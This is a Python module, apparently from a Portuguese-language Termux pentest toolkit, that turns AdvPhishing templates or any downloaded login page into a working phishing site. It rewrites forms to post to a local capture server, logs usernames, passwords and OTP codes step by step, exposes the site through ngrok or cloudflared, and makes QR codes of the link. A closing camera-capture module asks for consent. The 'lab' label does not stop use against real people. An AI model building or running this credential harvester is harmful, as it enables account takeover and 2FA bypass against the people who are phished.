#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Phishing de laboratório — adaptação Termux do AdvPhishing:
# servidor Python puro (sem PHP, sem apache, sem sudo/root).

import os
import re
import json
import threading
import urllib.request
from datetime import datetime
from http.server import HTTPServer, SimpleHTTPRequestHandler

from core import utils

ROOT = utils.ROOT
PAGES = os.path.join(ROOT, "modules", "phishing", "pages")
ADVP = os.path.join(ROOT, "modules", "phishing", "AdvPhishing")
# Os templates nao estao em Webpages/ (que so tem um .txt de exemplo) e sim em
# sites/<tema>/. Os .php sao paginas estaticas: nao ha bloco <?php nelas, entao
# converter para .html e so reescrever o <form> e renomear.
SITES_ADVP = os.path.join(ADVP, "sites")

_handler_state = {
    "redirect": "/",
    "dir": ".",
    "passos": [],  # paginas em sequencia: [index.html, pass.login.html, ...]
}

# Ordem de um fluxo de login: usuario -> senha -> otp.
_ORDEM_PASSOS = ("index.php", "pass.login.php", "otp.login.php")
# .php que sao handlers de captura do AdvPhishing ou helpers, nunca paginas.
_NAO_E_PAGINA = {"post.php", "posts.php", "postss.php", "ip.php", "adsct"}

_FIM = """<!doctype html><html><head><meta charset="utf-8">
<title>Captura concluida</title><style>body{font-family:sans-serif;background:#111;color:#eee;
display:flex;align-items:center;justify-content:center;height:100vh;margin:0;
text-align:center}div{max-width:32rem}h1{color:#25d366}</style></head>
<body><div><h1>Captura concluida</h1>
<p>Os dados foram gravados em <code>logs/phishing_captures.jsonl</code>.</p>
<p>Servidor de laboratorio &mdash; pode fechar.</p></div></body></html>""".encode("utf-8")


class _Handler(SimpleHTTPRequestHandler):
    """Serve as páginas e captura POSTs (credenciais/OTP) para o log do lab."""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=_handler_state["dir"], **kwargs)

    def do_POST(self):
        tamanho = int(self.headers.get("Content-Length", 0))
        corpo = self.rfile.read(tamanho).decode("utf-8", "replace")
        evento = {
            "data": datetime.now().isoformat(timespec="seconds"),
            "ip": self.client_address[0],
            "path": self.path,
            "etapa": self._etapa_atual(),
            "post": corpo,
        }
        try:
            destino = os.path.join(utils.caminho("logs"), "phishing_captures.jsonl")
            with open(destino, "a", encoding="utf-8") as f:
                f.write(json.dumps(evento, ensure_ascii=False) + "\n")
            try:
                os.chmod(destino, 0o600)  # capturas sao sensiveis
            except Exception:
                pass
        except Exception:
            pass
        # A captura vai para o stdout junto com o resto do CLI; nao ha como
        # esconder sem perder o feedback. O arquivo recebe chmod 600.
        print(utils.c("\n  [CAPTURA etapa={}] ip={} {}".format(
            evento["etapa"], evento["ip"], _resumir(corpo)), utils.VERDE))
        self._responder_redirecionando(self._proxima_etapa())

    def _etapa_atual(self):
        """Nome da pagina que recebeu o POST (1-based). 1 se nao houver passos."""
        passos = _handler_state["passos"]
        if not passos:
            return 1
        base = os.path.basename(self.path.split("?")[0])
        for i, passo in enumerate(passos, 1):
            if os.path.basename(passo) == base:
                return i
        # POST em '/' sem nome de etapa: e a primeira tela do fluxo.
        return 1 if base in ("", "/") else 0

    def _proxima_etapa(self):
        """Caminho da proxima pagina do fluxo, ou None se era a ultima."""
        passos = _handler_state["passos"]
        if not passos:
            return _handler_state["redirect"]
        atual = self._etapa_atual()
        if 0 < atual < len(passos):
            return "/" + os.path.basename(passos[atual])
        return None  # ultima etapa: mostra a tela de conclusao

    def _responder_redirecionando(self, destino):
        try:
            if destino is None:
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(_FIM)))
                self.end_headers()
                self.wfile.write(_FIM)
                return
            self.send_response(302)
            self.send_header("Location", destino)
            self.send_header("Content-Length", "0")
            self.end_headers()
        except Exception:
            pass

    def do_GET(self):
        # Tela de conclusao do fluxo. Todo o resto cai no SimpleHTTP.
        if self.path.split("?")[0].rstrip("/") == "/__fim":
            self._responder_redirecionando(None)
            return
        super().do_GET()

    def log_message(self, *args):
        """Silencia o log padrão do servidor."""
        pass


def _resumir(corpo, limite=120):
    """Encurta o corpo do POST para nao inundar o console com senhas."""
    txt = re.sub(r"\s+", " ", (corpo or "").strip())
    if len(txt) > limite:
        txt = txt[:limite] + "..."
    return txt


def _servir(diretorio, porta, redirect="/", host=None, passos=None):
    """Sobe o servidor HTTP em thread e bloqueia até Enter (parar).

    Padrao: 127.0.0.1 (somente a maquina local). Para vitima do lab em
    outra maquina use --host 0.0.0.0 (ou o modulo tunnel).
    """
    _handler_state["dir"] = diretorio
    _handler_state["redirect"] = redirect
    _handler_state["passos"] = list(passos or [])
    host = host or "127.0.0.1"
    try:
        srv = HTTPServer((host, porta), _Handler)
    except OSError as e:
        print(utils.c("  Nao foi possivel abrir {}:{}: {}".format(host, porta, e), utils.VERMELHO))
        return
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print(utils.c("  Servidor rodando em http://{}:{}".format(host, porta), utils.VERDE))
    if host in ("127.0.0.1", "localhost"):
        print("  Somente esta maquina enxerga o servidor.")
        print(utils.c("  Para vitima do lab: --host 0.0.0.0  (ou use o modulo tunnel).", utils.AMARELO))
    if len(_handler_state["passos"]) > 1:
        print(utils.c("  Fluxo com {} etapas: {}".format(
            len(_handler_state["passos"]),
            " -> ".join(os.path.basename(p) for p in _handler_state["passos"])), utils.CIANO))
    print("  Capturas sao salvas em logs/phishing_captures.jsonl (arquivo sensivel)")
    print(utils.c("  Use um tunel (modulo tunnel) para expor ao alvo do lab.", utils.AMARELO))
    try:
        input("  Enter para parar o servidor...")
    except EOFError:
        pass
    srv.shutdown()
    utils.log("phishing_server", host, "servidor encerrado")


def _parametros_phish(ctx, cfg):
    """(porta, host) vindos da CLI (--port/--host ou posicional numerico)."""
    pos, flags = utils.parse_extras(ctx.get("extras"))
    porta = cfg.get("phishing_port", 8080)
    if "port" in flags:
        try:
            porta = int(flags["port"])
        except ValueError:
            pass
    elif pos and pos[0].isdigit():
        porta = int(pos[0])
    host = flags.get("host") or cfg.get("phishing_host", "127.0.0.1")
    return porta, host


def _reescrever_formularios(html, etapa="index.html"):
    """Aponta os <form> para o nosso endpoint de captura, marcando a etapa.

    O action precisa carregar o NOME da pagina: como todo o fluxo passa pelo
    mesmo handler, um `action="/"` deixaria o servidor sem como saber se o POST
    e da tela de usuario, de senha ou de OTP. Postando para o proprio nome de
    arquivo, a etapa sai do path.

    Opera sobre a tag <form> inteira em vez de qualquer atributo `action=`, senao
    tambem reescreve `data-action=` e strings de JS sem relacao.
    """
    destino = "/" + etapa.lstrip("/")

    def sub_form(m):
        tag = m.group(0)
        if re.search(r"\baction\s*=", tag, flags=re.I):
            return re.sub(r"\baction\s*=\s*([\"']).*?\1", 'action="{}"'.format(destino),
                          tag, flags=re.I)
        return re.sub(r"\s*(/?>)$", r' action="{}" \1'.format(destino), tag)

    return re.sub(r"<form\b[^>]*>", sub_form, html, flags=re.I)


def _paginas_do_tema(pasta):
    """Paginas de entrada de um tema, na ordem do fluxo de login.

    Usa a ordem canonica (index -> pass.login -> otp.login) e cai para o
    primeiro .php que tenha <form> quando o tema nao segue esse nomeclado
    (ipfinder usa ip.php, por exemplo).
    """
    encontradas = []
    for nome in _ORDEM_PASSOS:
        if os.path.isfile(os.path.join(pasta, nome)):
            encontradas.append(nome)
    if encontradas:
        return encontradas
    for nome in sorted(os.listdir(pasta)):
        if not nome.endswith(".php") or nome in _NAO_E_PAGINA:
            continue
        try:
            with open(os.path.join(pasta, nome), encoding="utf-8", errors="ignore") as f:
                head = f.read(4000).lower()
        except Exception:
            continue
        if "<form" in head or "<html" in head:
            encontradas.append(nome)
            if len(encontradas) >= 3:
                break
    return encontradas


def _descobrir_templates():
    """Varre AdvPhishing/sites/ e devolve (usaveis, ignorados).

    usaveis  -> [(tema, [paginas])] ordenado por nome
    ignorados -> [(tema, motivo)] para os que nao tem pagina estatica
    """
    usaveis, ignorados = [], []
    if not os.path.isdir(SITES_ADVP):
        return usaveis, ignorados
    for tema in sorted(os.listdir(SITES_ADVP)):
        pasta = os.path.join(SITES_ADVP, tema)
        if not os.path.isdir(pasta) or tema.startswith("."):
            continue
        paginas = _paginas_do_tema(pasta)
        if paginas:
            usaveis.append((tema, paginas))
        else:
            # Casos reais: ipfinder/ so tem ip.php, que e 100% PHP (beacon que
            # grava IP + user-agent) e nao tem HTML para servir estaticamente.
            ignorados.append((tema, "so tem .php, sem pagina estatica"))
    return usaveis, ignorados


def _copiar_template(tema, paginas, destino):
    """Copia um tema para `destino` convertendo .php em .html. Devolve os passos.

    Tudo que nao e .php vai junto (CSS, JS, imagens) porque o HTML referencia os
    arquivos pelo nome local do mirror do AdvPhishing, incluindo o sufixo
    `.download` — renomear quebraria todas as referencias.
    """
    origem = os.path.join(SITES_ADVP, tema)
    os.makedirs(destino, exist_ok=True)
    passos = []
    for nome in paginas:
        try:
            with open(os.path.join(origem, nome), encoding="utf-8", errors="ignore") as f:
                html = f.read()
        except Exception as e:
            print(utils.c("  Falha ao ler {}: {}".format(nome, e), utils.VERMELHO))
            continue
        saida = nome[:-4] + ".html"  # .php -> .html
        # O action do form aponta para o proprio nome: e assim que o servidor
        # sabe em que etapa do fluxo o POST caiu.
        html = _reescrever_formularios(html, etapa=saida)
        with open(os.path.join(destino, saida), "w", encoding="utf-8") as f:
            f.write(html)
        passos.append(saida)

    copiados = 0
    for base, _dirs, arquivos in os.walk(origem):
        for arq in arquivos:
            # .php e .sh nao sao servidos: o primeiro foi convertido acima,
            # o segundo e script de execucao do AdvPhishing original.
            if arq.endswith((".php", ".sh")) or arq.startswith("."):
                continue
            origem_arq = os.path.join(base, arq)
            rel = os.path.relpath(base, origem)
            sub = destino if rel == "." else os.path.join(destino, rel)
            try:
                os.makedirs(sub, exist_ok=True)
                with open(origem_arq, "rb") as fi:
                    dados = fi.read()
                with open(os.path.join(sub, arq), "wb") as fo:
                    fo.write(dados)
                copiados += 1
            except Exception:
                pass
    return passos, copiados


def templates(alvo, ctx):
    """Serve templates do AdvPhishing com servidor Python (adaptado ao Termux)."""
    cfg = ctx["config"]
    porta, host = _parametros_phish(ctx, cfg)
    achados, ignorados = _descobrir_templates()
    if utils.is_dry(ctx):
        utils.mostrar_dry("templates", "{} temas em AdvPhishing/sites/ -> http://{}:{}".format(
            len(achados), host, porta))
        return
    if not _advphishing_clone():
        print(utils.c("  Clone cancelado/falhou.", utils.VERMELHO))
        return

    if not achados:
        print(utils.c("  Nenhum template utilizavel em {}.".format(SITES_ADVP), utils.VERMELHO))
        print(utils.c("  A pasta sites/ do AdvPhishing mudou de formato?", utils.AMARELO))
        return

    print(utils.c("\n  {} templates disponiveis em AdvPhishing/sites/:".format(len(achados)), utils.VERDE))
    for i, (tema, paginas) in enumerate(achados, 1):
        etapas = " {} etapa{}".format(len(paginas), "s" if len(paginas) > 1 else "")
        print("   [{:2d}] {}{}".format(
            i, utils.c(tema, utils.VERDE), utils.c(etapas, utils.CIANO)))
    if ignorados:
        print(utils.c("  Ignorados (sem pagina estatica): "
                      + ", ".join(t for t, _m in ignorados), utils.AMARELO))

    while True:
        escolha = utils.perguntar("Numero do template (0 = cancelar)", "1")
        if escolha.strip() in ("0", ""):
            print(utils.c("  Cancelado.", utils.AMARELO))
            return
        try:
            idx = int(escolha) - 1
            tema, paginas = achados[idx]
        except (ValueError, IndexError):
            print(utils.c("  Opcao invalida.", utils.VERMELHO))
            continue
        break

    pasta = os.path.join(PAGES, "template_{}_{}".format(
        datetime.now().strftime("%Y%m%d_%H%M%S"), tema))
    passos, copiados = _copiar_template(tema, paginas, pasta)
    if not passos:
        print(utils.c("  Nada a converter em '{}'.".format(tema), utils.VERMELHO))
        return
    print(utils.c("  '{}' pronto: {} pagina(s) convertida(s) + {} arquivos de apoio.".format(
        tema, len(passos), copiados), utils.VERDE))
    print(utils.c("  Formularios apontam para o endpoint de captura (POST /).", utils.CIANO))
    utils.log("phishing_templates", tema, "{} etapas em {}".format(len(passos), pasta))
    _servir(pasta, porta, host=host, passos=passos)


def clone_page(alvo, ctx):
    """Clona uma página de login para servidor local e captura POSTs."""
    cfg = ctx["config"]
    porta, host = _parametros_phish(ctx, cfg)
    if utils.is_dry(ctx):
        utils.mostrar_dry("clone_page", "clonar {} e servir em http://{}:{}".format(alvo, host, porta))
        return
    print("  Baixando {}...".format(alvo))
    try:
        req = urllib.request.Request(alvo, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=20) as r:
            html = r.read().decode("utf-8", "ignore")
    except Exception as e:
        print(utils.c("  Falha ao baixar: {}".format(e), utils.VERMELHO))
        return
    pasta = os.path.join(PAGES, "clone_{}".format(datetime.now().strftime("%Y%m%d_%H%M%S")))
    os.makedirs(pasta, exist_ok=True)
    html = _reescrever_formularios(html, etapa="index.html")
    with open(os.path.join(pasta, "index.html"), "w", encoding="utf-8") as f:
        f.write(html)
    print(utils.c("  Clone salvo em {}".format(pasta), utils.VERDE))
    print(utils.c("  Aviso: so o HTML foi baixado — CSS/JS/imagens faltam e a tela "
                  "fica sem estilo. Use 'templates' para telas completas.", utils.AMARELO))
    utils.log("clone_page", alvo, "clone salvo: {}".format(pasta))
    _servir(pasta, porta, host=host, passos=["index.html"])


def _advphishing_clone():
    """Clona o repositorio AdvPhishing (telas) se ainda nao existir."""
    destino = ADVP
    if os.path.isdir(destino):
        return True
    print(utils.c("  AdvPhishing nao encontrado localmente.", utils.AMARELO))
    if not utils.confirmar("  Clonar https://github.com/Ignitetch/AdvPhishing agora?", "s"):
        return False
    import subprocess
    try:
        status = subprocess.run(
            ["git", "clone", "--depth", "1",
             "https://github.com/Ignitetch/AdvPhishing.git", destino]).returncode
    except Exception as erro:
        print(utils.c("  git indisponivel: {}".format(erro), utils.VERMELHO))
        return False
    return status == 0


def tunnel(alvo, ctx):
    """Túnel público (ngrok ou cloudflared) para o clone local."""
    cfg = ctx["config"]
    porta, _host = _parametros_phish(ctx, cfg)
    if utils.is_dry(ctx):
        utils.mostrar_dry("tunnel", "expor localhost:{} via ngrok/cloudflared".format(porta))
        return
    import subprocess
    if utils.ferramenta_existe("cloudflared"):
        print("  Iniciando cloudflared (Ctrl+C para parar)...")
        utils.log("tunnel", "localhost", "cloudflared :{}".format(porta))
        try:
            subprocess.run(["cloudflared", "tunnel", "--url", "http://localhost:{}".format(porta)])
        except KeyboardInterrupt:
            pass
        return
    if utils.ferramenta_existe("ngrok"):
        print("  Iniciando ngrok (Ctrl+C para parar)...")
        utils.log("tunnel", "localhost", "ngrok :{}".format(porta))
        try:
            subprocess.run(["ngrok", "http", str(porta)])
        except KeyboardInterrupt:
            pass
        return
    print(utils.c("  Nenhum tunel encontrado (ngrok/cloudflared).", utils.VERMELHO))
    if utils.confirmar("  Tentar instalar cloudflared?", "n"):
        if utils.instalar_ferramenta("cloudflared"):
            print("  Rode novamente o modulo tunnel.")
    else:
        print(utils.c("  Sem tunel — cloudflared/ngrok nao instalados.", utils.AMARELO))


def qr(alvo, ctx):
    """Gera QR Code para a URL do phishing (terminal ou PNG)."""
    url = alvo
    if not url:
        url = utils.perguntar("URL (ex.: https://xxxx.ngrok.io)", "http://127.0.0.1:8080")
    if utils.is_dry(ctx):
        utils.mostrar_dry("qr", "gerar QR de {}".format(url))
        return
    try:
        import qrcode
    except ImportError:
        if not utils.instalar_dependencia("qrcode"):
            print(utils.c("  QR cancelado — pacote 'qrcode' indisponivel.", utils.VERMELHO))
            return
        import qrcode
    qr_obj = qrcode.QRCode(border=1, box_size=1)
    qr_obj.add_data(url)
    qr_obj.make(fit=True)
    try:
        qr_obj.print_ascii(invert=True)
    except Exception:
        pass
    try:
        os.makedirs(PAGES, exist_ok=True)
        img = qr_obj.make_image(fill_color="black", back_color="white")
        destino = os.path.join(PAGES, "qr.png")
        img.save(destino)
        print(utils.c("  PNG salvo em {}".format(destino), utils.VERDE))
    except Exception as e:
        print(utils.c("  PNG indisponivel (Pillow): {}".format(e), utils.AMARELO))
    utils.log("qr_phish", url, "QR gerado")


_MAGIC = {
    b"\xff\xd8\xff": "JPEG",
    b"\x89PNG": "PNG",
    b"GIF8": "GIF",
    b"BM": "BMP",
    b"RIFF": "WEBP/AVI",
}


def _validar_imagem(caminho):
    """Confere se o arquivo existe e tem cabecalho de imagem. Devolve (ok, tipo, bytes)."""
    try:
        tamanho = os.path.getsize(caminho)
    except OSError:
        return False, None, 0
    if tamanho < 128:  # JPEG minimo valido ja passa de 1KB
        return False, None, tamanho
    try:
        with open(caminho, "rb") as f:
            cab = f.read(16)
    except OSError:
        return False, None, tamanho
    for assinatura, tipo in _MAGIC.items():
        if cab.startswith(assinatura):
            return True, tipo, tamanho
    return False, None, tamanho


def _backends_camara():
    """Backends de captura disponiveis nesta maquina: [(id, rotulo, comando)].

    O comando e uma lista de argv (nunca string) e pode conter '{dest}' e '{dev}'.
    """
    achados = []
    if utils.ferramenta_existe("termux-camera-photo"):
        achados.append(("termux", "Termux:API (Android)",
                        ["termux-camera-photo", "{dest}"]))
    if utils.ferramenta_existe("fswebcam"):
        achados.append(("fswebcam", "fswebcam (Linux, webcam)",
                        ["fswebcam", "-q", "--no-banner", "-r", "1280x720", "{dest}"]))
    if utils.ferramenta_existe("imagesnap"):
        achados.append(("imagesnap", "imagesnap (macOS)",
                        ["imagesnap", "-q", "-1", "{dest}"]))
    if utils.ferramenta_existe("ffmpeg"):
        if os.name == "nt":
            achados.append(("ffmpeg-dshow", "ffmpeg dshow (Windows, webcam)",
                            ["ffmpeg", "-hide_banner", "-loglevel", "error", "-f", "dshow",
                             "-i", "video={dev}", "-frames:v", "1", "-y", "{dest}"]))
        else:
            achados.append(("ffmpeg-v4l2", "ffmpeg v4l2 (Linux, /dev/video0)",
                            ["ffmpeg", "-hide_banner", "-loglevel", "error", "-f", "v4l2",
                             "-i", "{dev}", "-frames:v", "1", "-y", "{dest}"]))
    return achados


def _dispositivo_padrao():
    """Nome do dispositivo de camera, ou None se nao houver."""
    if os.name == "nt":
        return None  # no Windows o nome exato depende do driver; perguntamos
    for cand in ("/dev/video0", "/dev/video1", "/dev/video2"):
        if os.path.exists(cand):
            return cand
    return None


def _cameras_windows():
    """Lista os nomes de webcam do DirectShow (Windows)."""
    import subprocess
    if not utils.ferramenta_existe("ffmpeg"):
        return []
    try:
        p = subprocess.run(["ffmpeg", "-hide_banner", "-list_devices", "true",
                            "-f", "dshow", "-i", "dummy"],
                           capture_output=True, text=True, timeout=20)
    except Exception:
        return []
    saida = (p.stderr or "") + (p.stdout or "")
    nomes = []
    for linha in saida.splitlines():
        m = re.search(r'"([^"]+)"', linha)
        if m and "video=" not in linha.lower() and not linha.strip().startswith("["):
            # linhas de device tem formato: "Nome do Device" (Alternative path ...)
            if m.group(1) not in nomes:
                nomes.append(m.group(1))
    return nomes


def _executar_captura(cmd, destino, device, timeout):
    """Roda o backend e devolve (ok, mensagem). Confere o arquivo, nao so o exit code."""
    import subprocess
    argv = [a.replace("{dest}", destino).replace("{dev}", device or "") for a in cmd]
    argv = [a for a in argv if a != ""]
    try:
        proc = subprocess.run(argv, capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return False, "tempo esgotado ({}s) — alguem precisa tocar em OK no aparelho".format(timeout)
    except Exception as e:
        return False, str(e)
    ok, tipo, tamanho = _validar_imagem(destino)
    if ok:
        return True, "{} gerado ({} bytes)".format(tipo, tamanho)
    # Exit 0 sem arquivo util: o Termux:API devolve 0 mesmo recusando permissao.
    detalhe = (proc.stderr or proc.stdout or "").strip().splitlines()
    return False, "nenhum arquivo valido (exit={}){}".format(
        proc.returncode, ": " + detalhe[-1] if detalhe else "")


def camera_sim(alvo, ctx):
    """Captura da camera LOCAL, com consentimento explicito em dupla confirmacao.

    Antes so existia backend Termux e o sucesso era inferido do exit code, o que
    dava falso positivo quando o Termux:API recusava a permissao. Agora ha cadeia
    de backends por plataforma e o arquivo gerado e verificado byte a byte.
    """
    if utils.is_dry(ctx):
        backends = _backends_camara()
        quais = ", ".join(b[0] for b in backends) or "nenhum detectado"
        utils.mostrar_dry("camera_sim", "capturar camera local em logs/camera_foto.jpg (backends: {})".format(quais))
        return

    print(utils.c("  Este modulo tira uma foto da camera do PROPRIO aparelho.", utils.AMARELO))
    print(utils.c("  Ele exige o consentimento explicito de quem for filmado.", utils.AMARELO))
    if not utils.confirmar("  A pessoa filmada consentiu com esta captura?", "n"):
        print(utils.c("  Sem consentimento — cancelado.", utils.VERMELHO))
        return
    if not utils.confirmar("  Confirmar a captura agora? (2a confirmacao)", "n"):
        print(utils.c("  Cancelado.", utils.VERMELHO))
        return

    backends = _backends_camara()
    if not backends:
        print(utils.c("\n  Nenhum backend de camera disponivel aqui.", utils.VERMELHO))
        if utils.eh_termux():
            print(utils.c("  No Termux: 'pkg install termux-api' e instale o app Termux:API", utils.AMARELO))
            print(utils.c("  (F-Droid). Depois reinicie o Termux.", utils.AMARELO))
        else:
            print(utils.c("  Linux:   'sudo apt install fswebcam'  ou  'sudo apt install ffmpeg'", utils.AMARELO))
            print(utils.c("  Windows: instale o ffmpeg e garanta que ele esteja no PATH.", utils.AMARELO))
            print(utils.c("  macOS:   'brew install imagesnap'", utils.AMARELO))
        print(utils.c("  No celular Android a camera via Termux exige a permissao CAMERA", utils.CIANO))
        print(utils.c("  concedida ao app Termux:API em Configuracoes > Apps.", utils.CIANO))
        utils.log("camera_sim", "local", "sem backend de camera")
        return

    print(utils.c("\n  Backends encontrados:", utils.VERDE))
    for i, (bid, rotulo, _c) in enumerate(backends, 1):
        print("   [{}] {} {}".format(i, utils.c(rotulo, utils.VERDE), utils.c("({})".format(bid), utils.CIANO)))
    padrao = 1
    if len(backends) > 1:
        escolha = utils.perguntar("  Backend [{}]".format(padrao), str(padrao))
        try:
            padrao = int(escolha)
        except ValueError:
            padrao = 1
    try:
        bid, rotulo, cmd = backends[padrao - 1]
    except IndexError:
        print(utils.c("  Opcao invalida.", utils.VERMELHO))
        return

    device = _dispositivo_padrao()
    if "{dev}" in " ".join(cmd):
        if os.name == "nt":
            cams = _cameras_windows()
            if not cams:
                print(utils.c("  Nenhuma webcam listada pelo ffmpeg (dshow).", utils.VERMELHO))
                utils.log("camera_sim", "local", "sem webcam (dshow)")
                return
            print(utils.c("  Webcams detectadas:", utils.VERDE))
            for i, nome in enumerate(cams, 1):
                print("   [{}] {}".format(i, nome))
            esc = utils.perguntar("  Numero da webcam", "1")
            try:
                device = cams[int(esc) - 1]
            except (ValueError, IndexError):
                device = cams[0]
        if not device:
            print(utils.c("  Nenhum /dev/video* encontrado.", utils.VERMELHO))
            utils.log("camera_sim", "local", "sem /dev/video*")
            return
        print(utils.c("  Dispositivo: {}".format(device), utils.CIANO))

    destino = os.path.join(utils.caminho("logs"), "camera_foto.jpg")
    os.makedirs(os.path.dirname(destino), exist_ok=True)
    if os.path.exists(destino):
        try:
            os.unlink(destino)  # nao confiar em arquivo de execucao anterior
        except OSError:
            pass

    # Termux:API abre a camera no celular e espera o OK na tela: tempo generoso.
    timeout = 120 if bid == "termux" else 30
    print(utils.c("\n  Capturando via {}...".format(rotulo), utils.CIANO))
    ok, msg = _executar_captura(cmd, destino, device, timeout)
    if ok:
        print(utils.c("  Foto salva em {} — {}".format(destino, msg), utils.VERDE))
        utils.log("camera_sim", "local", "{} ok ({})".format(bid, msg))
    else:
        print(utils.c("  Falha na captura: {}".format(msg), utils.VERMELHO))
        if bid == "termux":
            print(utils.c("  Causa comum: permissao CAMERA negada ao Termux:API, ou o", utils.AMARELO))
            print(utils.c("  aparelho travou na tela de confirmacao. Verifique em", utils.AMARELO))
            print(utils.c("  Configuracoes > Apps > Termux:API > Permissoes.", utils.AMARELO))
        elif bid.startswith("ffmpeg"):
            print(utils.c("  Causa comum: device errado, ou webcam ja em uso por outro app.", utils.AMARELO))
        utils.log("camera_sim", "local", "{} falhou: {}".format(bid, msg))
